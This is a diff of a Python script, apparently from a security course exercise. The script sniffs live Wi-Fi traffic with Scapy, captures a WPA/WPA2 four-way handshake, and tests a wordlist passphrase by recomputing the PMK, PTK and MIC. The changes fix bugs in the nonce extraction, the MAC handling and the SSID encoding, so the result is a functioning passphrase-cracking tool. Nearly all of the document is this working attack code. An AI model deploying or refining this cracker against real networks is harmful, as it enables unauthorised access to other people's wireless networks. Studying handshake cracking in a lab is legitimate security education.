@@ -47,11 +47,7 @@ if len(sys.argv) != 5:
     exit()
 
 # Read the passphrase from the file wordlist
-f= open("wordlist","r")
 
-if f.mode == 'r':
-    global passPhrase 
-    passPhrase = f.read()
 
 # Array to store the Authenticator nonce and the Supplicant nonce
 global nonces
@@ -71,28 +67,29 @@ mic_to_test = ""
 
 ssid = sys.argv[1]
 
-
 def pkt_callback(pkt):
-    if pkt.haslayer(EAPOL):
+    if pkt.haslayer(EAPOL) :
 
         pktList.append(pkt)
 
         if(len(pktList) == 4):
+            f= open("wordlist","r")
+            passPhrase = f.read()
             nonces.append(pktList[0].getlayer(Raw).load.hex()[26:90])
-            nonces.append(pktList[0].getlayer(Raw).load.hex()[26:90])
+            nonces.append(pktList[1].getlayer(Raw).load.hex()[26:90])
 
             APmac = a2b_hex((pktList[0][Dot11].addr3).replace(":",""))
-            Clientmac = a2b_hex((pkt[0][Dot11].addr1).replace(":", ""))
+            Clientmac = a2b_hex((pktList[0][Dot11].addr1).replace(":", ""))
 
             mic_to_test = pktList[3].getlayer(Raw).load.hex()[154:-4]
 
-        #if(pkt.getlayer(Raw).load.hex()[25:26] == '0'):  # We want the messages which replay counter is 0
-        #    nonces.append(pkt.getlayer(Raw).load.hex()[26:90])
-        #if(pkt.getlayer(Raw).load.hex()[:6] == '02030a'): # We check if this is the last handshake packet     
-        #    APmac = a2b_hex((pkt[Dot11].addr3).replace(":",""))
-        #    Clientmac = a2b_hex((pkt[Dot11].addr1).replace(":", ""))
-        #    
-        #    mic_to_test = pkt.getlayer(Raw).load.hex()[154:-4]
+            #if(pkt.getlayer(Raw).load.hex()[25:26] == '0'):  # We want the messages which replay counter is 0
+            #    nonces.append(pkt.getlayer(Raw).load.hex()[26:90])
+            #if(pkt.getlayer(Raw).load.hex()[:6] == '02030a'): # We check if this is the last handshake packet     
+            #    APmac = a2b_hex((pkt[Dot11].addr3).replace(":",""))
+            #    Clientmac = a2b_hex((pkt[Dot11].addr1).replace(":", ""))
+            #    
+            #    mic_to_test = pkt.getlayer(Raw).load.hex()[154:-4]
             print("[*] MIC found: " + mic_to_test)
 
             # Important parameters for key derivation - most of them can be obtained from the pcap file
@@ -113,14 +110,15 @@ def pkt_callback(pkt):
             # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
             passPhrase = str.encode(passPhrase)
 
-            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
-
+            pmk = pbkdf2(hashlib.sha1,passPhrase, str.encode(ssid), 4096, 32)
+            
             # expand pmk to obtain PTK
             ptk = customPRF512(pmk,str.encode(A), B)
 
             # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
             mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
+            print(mic.hexdigest())
             if mic.hexdigest()[:len(mic_to_test)] == mic_to_test:
                 print("[*] The passphrase (" + str(passPhrase) + ") is correct")
             else:
